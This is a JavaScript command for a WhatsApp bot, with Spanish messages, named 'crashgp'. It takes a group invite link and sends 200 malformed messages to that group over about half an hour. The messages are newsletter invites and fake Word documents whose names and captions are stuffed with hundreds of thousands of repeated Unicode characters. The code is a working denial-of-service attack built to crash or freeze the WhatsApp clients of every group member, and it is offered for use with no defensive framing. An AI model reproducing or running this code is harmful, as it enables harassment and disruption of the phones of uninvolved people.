let handler = async (m, { conn, text, isOwner, usedPrefix, command }) => {
    if (!isOwner) {
        return m.reply('Solo el propietario puede usar este comando.');
    }

    if (!text || !text.includes('whatsapp.com')) {
        return conn.sendMessage(m.chat, { text: `😿 Debes proporcionar el enlace del grupo.\nEjemplo: .${command} https://chat.whatsapp.com/XXXX` }, { quoted: m });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return conn.sendMessage(m.chat, { text: '😡 Enlace inválido.' }, { quoted: m });

    const inviteCode = match[1];
    let groupId;

    try {
        const res = await conn.groupGetInviteInfo(inviteCode);
        groupId = res.id;
    } catch (e) {
        return conn.sendMessage(m.chat, { text: "⚠️ No se pudo obtener el ID del grupo. Verifica que el enlace sea válido o que el grupo exista." }, { quoted: m });
    }

    const canalKillGrupo = async () => {
        const basura = 'ꦾ'.repeat(90000);
        await conn.relayMessage(groupId, {
            newsletterAdminInviteMessage: {
                newsletterJid: "12036322900056123@newsletter",
                newsletterName: "ADOi" + basura.repeat(3),
                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                caption: "El mDKDNND",
                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
            }
        }, {});
    };

    const docKillGrupo = async (i) => {
        const traba = 'ꦾ'.repeat(90000);
        const contenido = '\u200E'.repeat(5000) + i;
        await conn.sendMessage(groupId, {
            document: Buffer.from(contenido),
            fileName: `chinA 🔥_${i + 1}`.repeat(2),
            mimetype: 'application/msword',
            caption: traba.repeat(3)
        });
    };

    const canalGato = async () => {
        const basura = '𑇂𑆵𑆴𑆿'.repeat(75000);
        await conn.relayMessage(groupId, {
            newsletterAdminInviteMessage: {
                newsletterJid: "12036322970006123@newsletter",
                newsletterName: "🔥👾🔥👾" + basura.repeat(3),
                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                caption: "El mejor bot",
                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
            }
        }, {});
    };

    const docGato = async (i) => {
        const traba = '𑇂𑆵𑆴𑆿'.repeat(30000);
        const contenido = '\u200E'.repeat(5000) + i;
        await conn.sendMessage(groupId, {
            document: Buffer.from(contenido),
            fileName: `🔥 China  🔥_${i + 1}`.repeat(2),
            mimetype: 'application/msword',
            caption: traba.repeat(3)
        });
    };

    m.reply(`✅ Iniciando ataque al grupo: ${groupId}`);

    const delayMs = 9000;
    const total = 200;
    const ciclos = Math.floor(total / 4);

    for (let i = 0; i < ciclos; i++) {
        await canalKillGrupo();
        await new Promise(r => setTimeout(r, delayMs));

        await docKillGrupo(i);
        await new Promise(r => setTimeout(r, delayMs));

        await canalGato();
        await new Promise(r => setTimeout(r, delayMs));

        await docGato(i);
        await new Promise(r => setTimeout(r, delayMs));
    }

    const restantes = total % 4;
    const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato];
    for (let i = 0; i < restantes; i++) {
        await extra[i](i);
        await new Promise(r => setTimeout(r, delayMs));
    }

    await conn.sendMessage(m.chat, { text: `✅ 200 mensajes enviados al grupo ${groupId} en aproximadamente 30 minutos.` }, { quoted: m });
}

handler.command = ['crashgp', 'gp616']
handler.tags = ['owner']
handler.help = ['crashgp']
handler.owner = true

export default handler
